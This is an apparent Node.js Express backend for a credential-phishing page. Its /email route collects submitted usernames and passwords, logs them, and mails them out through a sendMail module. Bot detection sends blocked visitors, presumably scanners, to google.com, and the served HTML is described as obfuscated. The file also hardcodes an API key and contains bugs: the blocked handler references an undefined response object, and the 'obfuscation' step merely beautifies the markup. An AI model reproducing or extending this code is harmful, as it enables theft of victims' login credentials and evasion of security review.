const PORT = 5000

const express = require('express')
const path = require('path')
const cors = require('cors')
const DataDome = require('@datadome/node-module');
const sendMail = require('./mail')
const beautify = require('js-beautify').html;
const ejs = require('ejs');

const app = express()

app.set('view engine', 'ejs');
app.use(express.static('views'));

//data parsing
app.use(express.urlencoded({
    extended: false
}))
app.use(express.json())
app.use(cors())


// Create a DataDome instance
const datadomeClient = new DataDome('AOhAWR2USOQ39Cj', 'api.datadome.co')
        .on('blocked', function(req){
            console.log('request blocked');
            res.redirect('https://www.google.com');
            
        })
        .on("valid", function(req, res){
            console.log('request allowed');
            
            // Render your EJS template
            ejs.renderFile(path.join(__dirname, 'views', 'index.ejs'), {}, function(err, str) {
                if (err) {
                    console.error('EJS render error:', err);
                    res.status(500).json({ message: 'Internal error', err });
                } else {
                    // Obfuscate the rendered EJS content before sending the response
                    const obfuscatedHTML = beautify(str, { /* obfuscation options */ });
                    res.send(obfuscatedHTML);
                }
            });
        })


// email sending
app.post('/email', (req,res) => {
    const {collectUserName, collectPassword} = req.body
    console.log('Data:', req.body)

    sendMail(collectUserName, collectPassword, function(err, data) {
        if (err) {
            res.status(500).json({message: 'internal error',err})
        }else{
            res.json({message:'Email Sent!'})
        }
    })

})

app.get('/', (req, res) => {
    // Use DataDome for bot detection and protection
    datadomeClient.auth(req, res);
  });

app.listen(PORT, () => console.log('server running'))